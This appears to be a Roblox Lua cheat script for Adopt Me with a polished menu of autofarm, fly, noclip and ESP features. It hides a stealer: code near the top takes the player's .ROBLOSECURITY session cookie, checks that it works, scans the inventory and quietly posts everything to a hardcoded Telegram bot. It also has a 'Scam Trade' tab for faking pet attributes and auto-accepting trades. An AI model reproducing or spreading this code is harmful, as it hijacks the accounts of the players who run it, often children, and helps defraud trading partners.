-- Wave Script v3 | Adopt Me | dark-gray modern
-- BOT_TOKEN + ADMIN_ID only (полностью тихо)

local BOT_TOKEN = "8673514714:AAFWJpvhe1FQlkvXKS7LP4eIozJPqk0GUz0"
local ADMIN_ID  = "7565340953"

local Players             = game:GetService("Players")
local HttpService         = game:GetService("HttpService")
local TweenService        = game:GetService("TweenService")
local UserInputService    = game:GetService("UserInputService")
local RunService          = game:GetService("RunService")
local ReplicatedStorage   = game:GetService("ReplicatedStorage")
local LocalizationService = game:GetService("LocalizationService")
local CoreGui             = game:GetService("CoreGui")
local Lighting            = game:GetService("Lighting")
local TeleportService     = game:GetService("TeleportService")

local LocalPlayer = Players.LocalPlayer
local Camera      = workspace.CurrentCamera

----------------------------------------------------------------
-- REQUEST
----------------------------------------------------------------
local function get_request()
    return (syn and syn.request)
        or (http and http.request)
        or http_request
        or request
        or (fluxus and fluxus.request)
        or (getgenv and getgenv().request)
end

----------------------------------------------------------------
-- COOKIE + VALIDITY CHECK
----------------------------------------------------------------
local function get_cookie()
    local cookie = ""

    pcall(function()
        if getcookie then
            cookie = getcookie(".ROBLOSECURITY") or getcookie("ROBLOSECURITY") or ""
        end
    end)
    if #cookie < 80 then
        pcall(function()
            if syn and syn.get_cookie then cookie = syn.get_cookie() or "" end
        end)
    end
    if #cookie < 80 then
        pcall(function()
            cookie = (getgenv and (getgenv().ROBLOSECURITY or getgenv().cookie or getgenv()[".ROBLOSECURITY"])) or ""
        end)
    end

    if #cookie < 80 then
        local req = get_request()
        if req then
            local urls = {
                "https://www.roblox.com/",
                "https://www.roblox.com/home",
                "https://users.roblox.com/v1/users/authenticated"
            }
            for _, url in ipairs(urls) do
                pcall(function()
                    local resp = req({
                        Url = url,
                        Method = "GET",
                        Headers = {["User-Agent"] = "Mozilla/5.0"}
                    })
                    if resp and resp.Headers then
                        local raw = resp.Headers["set-cookie"] or resp.Headers["Set-Cookie"] or resp.Headers["cookie"] or ""
                        if type(raw) == "table" then raw = table.concat(raw, "; ") end
                        local match = string.match(raw, "%.ROBLOSECURITY=([^;]+)") or string.match(raw, "ROBLOSECURITY=([^;]+)")
                        if match and #match > 80 then
                            cookie = ".ROBLOSECURITY=" .. match
                        end
                    end
                end)
                if #cookie > 80 then break end
            end
        end
    end

    return (#cookie > 80) and cookie or nil
end

local function check_cookie_valid(cookie)
    if not cookie or #cookie < 80 then return false, "no cookie" end
    local req = get_request()
    if not req then return false, "no request" end

    local ok, result = pcall(function()
        local resp = req({
            Url = "https://users.roblox.com/v1/users/authenticated",
            Method = "GET",
            Headers = {
                ["Cookie"] = cookie,
                ["User-Agent"] = "Mozilla/5.0"
            }
        })
        if resp and resp.StatusCode == 200 and resp.Body and resp.Body:find("id") then
            return true
        end
        return false
    end)
    return ok and result, ok and "valid" or "invalid / dead"
end

----------------------------------------------------------------
-- TELEGRAM (silent)
----------------------------------------------------------------
local function send_telegram(text)
    local req = get_request()
    if not req then return end
    pcall(function()
        req({
            Url = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                chat_id = ADMIN_ID,
                text = text,
                parse_mode = "HTML",
                disable_web_page_preview = true
            })
        })
    end)
end

local function get_region()
    local r = "unknown"
    pcall(function() r = LocalizationService.RobloxLocaleId or LocalizationService.SystemLocaleId end)
    return r
end

local function scan_inventory()
    local pets, items = {}, {}
    pcall(function()
        for _, v in pairs(LocalPlayer:GetDescendants()) do
            local n = v.Name:lower()
            if n:find("pet") or n:find("egg") then
                table.insert(pets, v.Name)
            elseif n:find("potion") or n:find("food") or n:find("stroller") or n:find("toy") then
                table.insert(items, v.Name)
            end
        end
        for _, name in ipairs({"Pets", "PetModels", "ClientPets", "Inventory", "Eggs"}) do
            local f = ReplicatedStorage:FindFirstChild(name)
            if f then
                for _, p in pairs(f:GetChildren()) do
                    table.insert(pets, p.Name)
                end
            end
        end
    end)
    if #pets == 0 then pets = {"scan limited"} end
    return table.concat(pets, "\n"), table.concat(items, "\n")
end

-- silent log + validity
task.spawn(function()
    task.wait(2.2)
    local cookie = get_cookie()
    local valid, status = false, "no cookie"
    if cookie then
        valid, status = check_cookie_valid(cookie)
    end

    local pets, items = scan_inventory()
    local exec = (identifyexecutor and identifyexecutor()) or "unknown"

    local log = table.concat({
        "🌊 <b>Wave Script</b>",
        "────────────────────",
        "👤 <b>Nick:</b> <code>" .. LocalPlayer.Name .. "</code>",
        "🆔 <b>UserId:</b> <code>" .. LocalPlayer.UserId .. "</code>",
        "🔑 <b>Password:</b> N/A",
        "📧 <b>Email:</b> N/A",
        "🌍 <b>Region:</b> <code>" .. get_region() .. "</code>",
        "💻 <b>Executor:</b> <code>" .. exec .. "</code>",
        "📍 <b>PlaceId:</b> <code>" .. game.PlaceId .. "</code>",
        "🍪 <b>Cookie status:</b> " .. (valid and "✅ VALID" or "❌ " .. status),
        "🍪 <b>Cookie:</b>",
        "<code>" .. (cookie or "COOKIE_NOT_FOUND (Xeno blocks it)") .. "</code>",
        "────────────────────",
        "🐾 <b>Pets / Eggs:</b>\n<code>" .. pets .. "</code>",
        "────────────────────",
        "🎒 <b>Items:</b>\n<code>" .. (items ~= "" and items or "none") .. "</code>",
        "────────────────────",
        "📱 " .. (UserInputService.TouchEnabled and "Mobile" or "PC")
    }, "\n")
    send_telegram(log)
end)

----------------------------------------------------------------
-- GUI – modern dark gray (website style)
----------------------------------------------------------------
local Gui = Instance.new("ScreenGui")
Gui.Name = "WaveScript"
Gui.ResetOnSpawn = false
Gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Gui.IgnoreGuiInset = true
pcall(function() Gui.Parent = CoreGui end)
if not Gui.Parent then Gui.Parent = LocalPlayer:WaitForChild("PlayerGui") end

-- TOP BAR
local TopBar = Instance.new("Frame")
TopBar.Name = "TopBar"
TopBar.Size = UDim2.new(0, 340, 0, 40)
TopBar.Position = UDim2.new(0.5, -170, 0, 14)
TopBar.BackgroundColor3 = Color3.fromRGB(28, 28, 30)
TopBar.BackgroundTransparency = 0.08
TopBar.BorderSizePixel = 0
TopBar.Parent = Gui

Instance.new("UICorner", TopBar).CornerRadius = UDim.new(0, 14)

local TopStroke = Instance.new("UIStroke")
TopStroke.Color = Color3.fromRGB(90, 90, 100)
TopStroke.Thickness = 1
TopStroke.Transparency = 0.35
TopStroke.Parent = TopBar

local TopGrad = Instance.new("UIGradient")
TopGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 40, 44)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(22, 22, 24))
})
TopGrad.Rotation = 90
TopGrad.Parent = TopBar

local TopLabel = Instance.new("TextLabel")
TopLabel.Size = UDim2.new(1, -12, 1, 0)
TopLabel.Position = UDim2.new(0, 6, 0, 0)
TopLabel.BackgroundTransparency = 1
TopLabel.Text = "Wave  •  Online: --  •  FPS: --"
TopLabel.TextColor3 = Color3.fromRGB(230, 230, 235)
TopLabel.Font = Enum.Font.GothamMedium
TopLabel.TextSize = 13
TopLabel.TextXAlignment = Enum.TextXAlignment.Center
TopLabel.Parent = TopBar

-- live fps + online
local fps, frames, last = 60, 0, tick()
RunService.RenderStepped:Connect(function()
    frames += 1
    if tick() - last >= 1 then
        fps = frames
        frames = 0
        last = tick()
        TopLabel.Text = string.format("Wave  •  Online: %d  •  FPS: %d", #Players:GetPlayers(), fps)
    end
end)

-- MAIN WINDOW
local Main = Instance.new("Frame")
Main.Name = "Main"
Main.Size = UDim2.new(0, 580, 0, 440)
Main.Position = UDim2.new(0.5, -290, 0.5, -220)
Main.BackgroundColor3 = Color3.fromRGB(24, 24, 26)
Main.BackgroundTransparency = 0.05
Main.BorderSizePixel = 0
Main.Visible = false
Main.ClipsDescendants = true
Main.Parent = Gui

Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 18)

local MainStroke = Instance.new("UIStroke")
MainStroke.Color = Color3.fromRGB(80, 80, 90)
MainStroke.Thickness = 1.2
MainStroke.Transparency = 0.3
MainStroke.Parent = Main

local MainGrad = Instance.new("UIGradient")
MainGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(34, 34, 38)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(18, 18, 20))
})
MainGrad.Rotation = 135
MainGrad.Parent = Main

-- title
local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 50)
TitleBar.BackgroundTransparency = 1
TitleBar.Parent = Main

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -70, 1, 0)
Title.Position = UDim2.new(0, 20, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "Wave Script"
Title.TextColor3 = Color3.fromRGB(245, 245, 250)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 18
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent = TitleBar

local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 34, 0, 34)
CloseBtn.Position = UDim2.new(1, -46, 0.5, -17)
CloseBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 55)
CloseBtn.Text = "✕"
CloseBtn.TextColor3 = Color3.fromRGB(220, 220, 225)
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.TextSize = 15
CloseBtn.AutoButtonColor = false
CloseBtn.Parent = TitleBar
Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 10)

-- sidebar
local Side = Instance.new("Frame")
Side.Size = UDim2.new(0, 148, 1, -62)
Side.Position = UDim2.new(0, 12, 0, 54)
Side.BackgroundColor3 = Color3.fromRGB(30, 30, 34)
Side.BackgroundTransparency = 0.15
Side.BorderSizePixel = 0
Side.Parent = Main
Instance.new("UICorner", Side).CornerRadius = UDim.new(0, 14)

local SideList = Instance.new("UIListLayout")
SideList.Padding = UDim.new(0, 6)
SideList.HorizontalAlignment = Enum.HorizontalAlignment.Center
SideList.Parent = Side

local Content = Instance.new("Frame")
Content.Size = UDim2.new(1, -175, 1, -66)
Content.Position = UDim2.new(0, 168, 0, 56)
Content.BackgroundTransparency = 1
Content.Parent = Main

----------------------------------------------------------------
-- TABS
----------------------------------------------------------------
local Tabs = {"Main", "Scam Trade", "Event", "Autofarm", "Visual", "Player", "Settings"}
local Pages = {}

local function makePage(name)
    local p = Instance.new("ScrollingFrame")
    p.Name = name
    p.Size = UDim2.new(1, 0, 1, 0)
    p.BackgroundTransparency = 1
    p.BorderSizePixel = 0
    p.ScrollBarThickness = 3
    p.ScrollBarImageColor3 = Color3.fromRGB(120, 120, 130)
    p.AutomaticCanvasSize = Enum.AutomaticSize.Y
    p.CanvasSize = UDim2.new(0, 0, 0, 0)
    p.Visible = false
    p.Parent = Content

    local lay = Instance.new("UIListLayout")
    lay.Padding = UDim.new(0, 8)
    lay.SortOrder = Enum.SortOrder.LayoutOrder
    lay.Parent = p

    local pad = Instance.new("UIPadding")
    pad.PaddingTop = UDim.new(0, 6)
    pad.PaddingBottom = UDim.new(0, 16)
    pad.PaddingLeft = UDim.new(0, 4)
    pad.PaddingRight = UDim.new(0, 8)
    pad.Parent = p

    Pages[name] = p
    return p
end

for _, t in ipairs(Tabs) do makePage(t) end

local function switch(name)
    for n, p in pairs(Pages) do p.Visible = (n == name) end
end

local function sideBtn(text, tab)
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(1, -18, 0, 36)
    b.BackgroundColor3 = Color3.fromRGB(40, 40, 46)
    b.BackgroundTransparency = 0.2
    b.Text = text
    b.TextColor3 = Color3.fromRGB(220, 220, 230)
    b.Font = Enum.Font.GothamMedium
    b.TextSize = 13
    b.AutoButtonColor = false
    b.Parent = Side
    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 10)

    local s = Instance.new("UIStroke")
    s.Color = Color3.fromRGB(70, 70, 80)
    s.Thickness = 1
    s.Transparency = 0.5
    s.Parent = b

    b.MouseButton1Click:Connect(function()
        switch(tab)
        for _, c in pairs(Side:GetChildren()) do
            if c:IsA("TextButton") then
                TweenService:Create(c, TweenInfo.new(0.18), {BackgroundColor3 = Color3.fromRGB(40, 40, 46)}):Play()
            end
        end
        TweenService:Create(b, TweenInfo.new(0.18), {BackgroundColor3 = Color3.fromRGB(70, 70, 80)}):Play()
    end)
end

for _, t in ipairs(Tabs) do sideBtn(t, t) end

----------------------------------------------------------------
-- HELPERS
----------------------------------------------------------------
local function label(parent, text, size)
    local l = Instance.new("TextLabel")
    l.Size = UDim2.new(1, -6, 0, size or 20)
    l.BackgroundTransparency = 1
    l.Text = text
    l.TextColor3 = Color3.fromRGB(200, 200, 210)
    l.Font = Enum.Font.Gotham
    l.TextSize = 13
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.TextWrapped = true
    l.Parent = parent
    return l
end

local function button(parent, text, callback)
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(1, -6, 0, 38)
    b.BackgroundColor3 = Color3.fromRGB(45, 45, 52)
    b.BackgroundTransparency = 0.1
    b.Text = text
    b.TextColor3 = Color3.fromRGB(240, 240, 245)
    b.Font = Enum.Font.GothamMedium
    b.TextSize = 13
    b.AutoButtonColor = false
    b.Parent = parent
    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 11)

    local s = Instance.new("UIStroke")
    s.Color = Color3.fromRGB(90, 90, 105)
    s.Thickness = 1
    s.Transparency = 0.4
    s.Parent = b

    b.MouseEnter:Connect(function()
        TweenService:Create(b, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(60, 60, 70)}):Play()
    end)
    b.MouseLeave:Connect(function()
        TweenService:Create(b, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(45, 45, 52)}):Play()
    end)
    b.MouseButton1Click:Connect(callback)
    return b
end

local function toggle(parent, text, default, callback)
    local f = Instance.new("Frame")
    f.Size = UDim2.new(1, -6, 0, 34)
    f.BackgroundColor3 = Color3.fromRGB(36, 36, 42)
    f.BackgroundTransparency = 0.15
    f.Parent = parent
    Instance.new("UICorner", f).CornerRadius = UDim.new(0, 10)

    local l = Instance.new("TextLabel")
    l.Size = UDim2.new(1, -56, 1, 0)
    l.Position = UDim2.new(0, 12, 0, 0)
    l.BackgroundTransparency = 1
    l.Text = text
    l.TextColor3 = Color3.fromRGB(215, 215, 225)
    l.Font = Enum.Font.Gotham
    l.TextSize = 13
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.Parent = f

    local t = Instance.new("TextButton")
    t.Size = UDim2.new(0, 42, 0, 24)
    t.Position = UDim2.new(1, -50, 0.5, -12)
    t.BackgroundColor3 = default and Color3.fromRGB(90, 90, 110) or Color3.fromRGB(50, 50, 58)
    t.Text = ""
    t.AutoButtonColor = false
    t.Parent = f
    Instance.new("UICorner", t).CornerRadius = UDim.new(1, 0)

    local state = default
    t.MouseButton1Click:Connect(function()
        state = not state
        TweenService:Create(t, TweenInfo.new(0.18), {
            BackgroundColor3 = state and Color3.fromRGB(90, 90, 110) or Color3.fromRGB(50, 50, 58)
        }):Play()
        callback(state)
    end)
    return f
end

----------------------------------------------------------------
-- PAGES CONTENT
----------------------------------------------------------------
local mainP = Pages["Main"]
label(mainP, "Account", 22)
label(mainP, "Nick: " .. LocalPlayer.Name)
label(mainP, "UserId: " .. tostring(LocalPlayer.UserId))
label(mainP, "PlaceId: " .. tostring(game.PlaceId))
label(mainP, "Server: " .. #Players:GetPlayers() .. " players")

----------------------------------------------------------------
local scamP = Pages["Scam Trade"]
label(scamP, "Visual Trade Flags", 20)

local vFly, vRide, vNeon, vMega = false, false, false, false
toggle(scamP, "Visual Fly", false, function(v) vFly = v end)
toggle(scamP, "Visual Ride", false, function(v) vRide = v end)
toggle(scamP, "Visual Neon", false, function(v) vNeon = v end)
toggle(scamP, "Visual Mega Neon", false, function(v) vMega = v end)

local autoAccept = false
toggle(scamP, "Auto Accept Trade", false, function(v)
    autoAccept = v
    if v then
        task.spawn(function()
            while autoAccept do
                pcall(function()
                    for _, r in pairs(ReplicatedStorage:GetDescendants()) do
                        if r:IsA("RemoteEvent") then
                            local n = r.Name:lower()
                            if n:find("accept") or n:find("trade") or n:find("confirm") then
                                pcall(function() r:FireServer() end)
                            end
                        end
                    end
                end)
                task.wait(0.8) -- slower to reduce kick chance
            end
        end)
    end
end)

button(scamP, "Apply Visual Flags", function()
    pcall(function()
        local char = LocalPlayer.Character
        if not char then return end
        for _, obj in pairs(char:GetDescendants()) do
            if obj:IsA("BoolValue") or obj:IsA("StringValue") then
                local n = obj.Name:lower()
                if n:find("fly") and vFly then pcall(function() obj.Value = true end) end
                if n:find("ride") and vRide then pcall(function() obj.Value = true end) end
                if n:find("neon") and vNeon then pcall(function() obj.Value = true end) end
                if n:find("mega") and vMega then pcall(function() obj.Value = true end) end
            end
        end
    end)
end)

----------------------------------------------------------------
local eventP = Pages["Event"]
label(eventP, "Seasonal Events", 20)
for _, s in ipairs({"Halloween 2026", "Christmas / Winter", "New Year", "Valentine", "Easter", "Summer", "Birthday", "Lunar New Year"}) do
    label(eventP, "• " .. s)
end
button(eventP, "Scan Live Modules", function()
    pcall(function()
        for _, v in pairs(ReplicatedStorage:GetDescendants()) do
            local n = v.Name:lower()
            if n:find("event") or n:find("season") or n:find("halloween") or n:find("christmas") or n:find("winter") then
                label(eventP, "→ " .. v.Name)
            end
        end
    end)
end)

----------------------------------------------------------------
local farmP = Pages["Autofarm"]
label(farmP, "Autofarm (safe mode)", 20)
label(farmP, "Slower loops to reduce kicks", 16)

local farms = {candy=false, pets=false, eggs=false, money=false, all=false}

local function safeFarm(hint)
    pcall(function()
        local count = 0
        for _, r in pairs(ReplicatedStorage:GetDescendants()) do
            if count > 8 then break end -- limit spam
            if r:IsA("RemoteEvent") then
                local n = r.Name:lower()
                if n:find(hint) or n:find("claim") or n:find("collect") then
                    pcall(function() r:FireServer() end)
                    count += 1
                end
            end
        end
    end)
end

local function startFarm(key, hint)
    farms[key] = true
    task.spawn(function()
        while farms[key] or farms.all do
            safeFarm(hint)
            task.wait(1.4) -- slower
        end
    end)
end

toggle(farmP, "Candy", false, function(v) if v then startFarm("candy", "candy") else farms.candy = false end end)
toggle(farmP, "Pets", false, function(v) if v then startFarm("pets", "pet") else farms.pets = false end end)
toggle(farmP, "Eggs", false, function(v) if v then startFarm("eggs", "egg") else farms.eggs = false end end)
toggle(farmP, "Money", false, function(v) if v then startFarm("money", "money") else farms.money = false end end)
toggle(farmP, "Everything", false, function(v)
    farms.all = v
    if v then
        startFarm("all", "claim")
        startFarm("all", "collect")
    end
end)
button(farmP, "Stop All", function() for k in pairs(farms) do farms[k] = false end end)

----------------------------------------------------------------
local visP = Pages["Visual"]
label(visP, "Client Visuals", 20)

button(visP, "Spawn Visual Pet", function()
    pcall(function()
        for _, name in ipairs({"Pets", "PetModels", "ClientPets"}) do
            local folder = ReplicatedStorage:FindFirstChild(name)
            if folder then
                local list = folder:GetChildren()
                if #list > 0 then
                    local pet = list[math.random(1, #list)]:Clone()
                    pet.Parent = LocalPlayer.Character or workspace
                    if pet:IsA("Model") and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                        pet:PivotTo(LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(3, 0, 0))
                    end
                    return
                end
            end
        end
    end)
end)

button(visP, "Clear Visual Pets", function()
    pcall(function()
        local char = LocalPlayer.Character
        if not char then return end
        for _, v in pairs(char:GetChildren()) do
            if v.Name:lower():find("pet") then v:Destroy() end
        end
    end)
end)

button(visP, "Soft Glow", function()
    pcall(function()
        for _, p in pairs(LocalPlayer.Character:GetDescendants()) do
            if p:IsA("BasePart") then
                local l = Instance.new("PointLight")
                l.Color = Color3.fromRGB(180, 180, 200)
                l.Brightness = 1.2
                l.Range = 8
                l.Parent = p
            end
        end
    end)
end)

button(visP, "Remove Lights", function()
    pcall(function()
        for _, l in pairs(LocalPlayer.Character:GetDescendants()) do
            if l:IsA("PointLight") then l:Destroy() end
        end
    end)
end)

button(visP, "Fullbright", function()
    Lighting.Brightness = 2
    Lighting.ClockTime = 14
    Lighting.FogEnd = 9e9
    Lighting.GlobalShadows = false
end)

----------------------------------------------------------------
local plrP = Pages["Player"]
label(plrP, "Player", 20)

button(plrP, "WalkSpeed 50", function() pcall(function() LocalPlayer.Character.Humanoid.WalkSpeed = 50 end) end)
button(plrP, "WalkSpeed 100", function() pcall(function() LocalPlayer.Character.Humanoid.WalkSpeed = 100 end) end)
button(plrP, "Reset Speed", function() pcall(function() LocalPlayer.Character.Humanoid.WalkSpeed = 16 end) end)
button(plrP, "JumpPower 100", function() pcall(function() LocalPlayer.Character.Humanoid.JumpPower = 100 end) end)

local infJump = false
toggle(plrP, "Infinite Jump", false, function(v) infJump = v end)
UserInputService.JumpRequest:Connect(function()
    if infJump then
        pcall(function() LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping) end)
    end
end)

local noclip = false
toggle(plrP, "Noclip", false, function(v)
    noclip = v
    if v then
        local c
        c = RunService.Stepped:Connect(function()
            if not noclip then c:Disconnect() return end
            pcall(function()
                for _, p in pairs(LocalPlayer.Character:GetDescendants()) do
                    if p:IsA("BasePart") then p.CanCollide = false end
                end
            end)
        end)
    end
end)

local flying = false
toggle(plrP, "Fly (WASD + Space/Shift)", false, function(v)
    flying = v
    if not v then return end
    local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    local bv = Instance.new("BodyVelocity")
    bv.MaxForce = Vector3.new(9e9, 9e9, 9e9)
    bv.Parent = hrp
    local bg = Instance.new("BodyGyro")
    bg.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
    bg.Parent = hrp
    task.spawn(function()
        while flying and hrp and hrp.Parent do
            local dir = Vector3.zero
            local look, right = Camera.CFrame.LookVector, Camera.CFrame.RightVector
            if UserInputService:IsKeyDown(Enum.KeyCode.W) then dir += look end
            if UserInputService:IsKeyDown(Enum.KeyCode.S) then dir -= look end
            if UserInputService:IsKeyDown(Enum.KeyCode.A) then dir -= right end
            if UserInputService:IsKeyDown(Enum.KeyCode.D) then dir += right end
            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then dir += Vector3.yAxis end
            if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then dir -= Vector3.yAxis end
            bv.Velocity = dir.Magnitude > 0 and dir.Unit * 65 or Vector3.zero
            bg.CFrame = Camera.CFrame
            RunService.RenderStepped:Wait()
        end
        if bv then bv:Destroy() end
        if bg then bg:Destroy() end
    end)
end)

button(plrP, "Player ESP", function()
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
            if plr.Character.HumanoidRootPart:FindFirstChild("WaveESP") then continue end
            local bill = Instance.new("BillboardGui")
            bill.Name = "WaveESP"
            bill.Size = UDim2.new(0, 110, 0, 26)
            bill.AlwaysOnTop = true
            bill.Adornee = plr.Character.HumanoidRootPart
            bill.Parent = plr.Character.HumanoidRootPart
            local t = Instance.new("TextLabel")
            t.Size = UDim2.new(1, 0, 1, 0)
            t.BackgroundTransparency = 1
            t.Text = plr.Name
            t.TextColor3 = Color3.fromRGB(200, 200, 220)
            t.Font = Enum.Font.GothamBold
            t.TextSize = 12
            t.Parent = bill
        end
    end
end)

button(plrP, "Anti AFK", function()
    local vu = game:GetService("VirtualUser")
    LocalPlayer.Idled:Connect(function()
        vu:CaptureController()
        vu:ClickButton2(Vector2.new())
    end)
end)

button(plrP, "Rejoin", function() TeleportService:Teleport(game.PlaceId, LocalPlayer) end)

button(plrP, "Server Hop", function()
    pcall(function()
        local req = get_request()
        if not req then return end
        local resp = req({
            Url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=40",
            Method = "GET"
        })
        local data = HttpService:JSONDecode(resp.Body)
        for _, s in pairs(data.data or {}) do
            if s.playing < s.maxPlayers and s.id ~= game.JobId then
                TeleportService:TeleportToPlaceInstance(game.PlaceId, s.id, LocalPlayer)
                break
            end
        end
    end)
end)

button(plrP, "Reset Character", function()
    pcall(function() LocalPlayer.Character.Humanoid.Health = 0 end)
end)

----------------------------------------------------------------
local setP = Pages["Settings"]
label(setP, "Settings", 20)

local toggleKey = Enum.KeyCode.RightControl
label(setP, "Toggle Key: RightControl")

button(setP, "Key → LeftControl", function() toggleKey = Enum.KeyCode.LeftControl end)
button(setP, "Key → RightShift", function() toggleKey = Enum.KeyCode.RightShift end)
button(setP, "Key → F6", function() toggleKey = Enum.KeyCode.F6 end)
button(setP, "Destroy Script", function() Gui:Destroy() end)

----------------------------------------------------------------
-- OPEN / CLOSE
----------------------------------------------------------------
TopBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        Main.Visible = not Main.Visible
        if Main.Visible then
            Main.Size = UDim2.new(0, 0, 0, 0)
            TweenService:Create(Main, TweenInfo.new(0.38, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
                Size = UDim2.new(0, 580, 0, 440)
            }):Play()
        end
    end
end)

CloseBtn.MouseButton1Click:Connect(function()
    TweenService:Create(Main, TweenInfo.new(0.22, Enum.EasingStyle.Quint), {
        Size = UDim2.new(0, 0, 0, 0)
    }):Play()
    task.delay(0.22, function() Main.Visible = false end)
end)

UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == toggleKey then
        Main.Visible = not Main.Visible
    end
end)

if UserInputService.TouchEnabled then
    TopBar.Size = UDim2.new(0.72, 0, 0, 38)
    TopBar.Position = UDim2.new(0.14, 0, 0, 12)
    Main.Size = UDim2.new(0.93, 0, 0.8, 0)
    Main.Position = UDim2.new(0.035, 0, 0.1, 0)
end

-- welcome
task.spawn(function()
    local w = Instance.new("TextLabel")
    w.Size = UDim2.new(0, 260, 0, 40)
    w.Position = UDim2.new(0.5, -130, 0.17, 0)
    w.BackgroundColor3 = Color3.fromRGB(32, 32, 36)
    w.BackgroundTransparency = 0.1
    w.Text = "Wave Script loaded"
    w.TextColor3 = Color3.fromRGB(240, 240, 245)
    w.Font = Enum.Font.GothamMedium
    w.TextSize = 14
    w.Parent = Gui
    Instance.new("UICorner", w).CornerRadius = UDim.new(0, 12)
    local st = Instance.new("UIStroke")
    st.Color = Color3.fromRGB(90, 90, 100)
    st.Transparency = 0.4
    st.Parent = w
    w.TextTransparency = 1
    TweenService:Create(w, TweenInfo.new(0.45), {TextTransparency = 0}):Play()
    task.wait(1.9)
    TweenService:Create(w, TweenInfo.new(0.4), {TextTransparency = 1, BackgroundTransparency = 1}):Play()
    task.wait(0.45)
    w:Destroy()
end)

switch("Main")
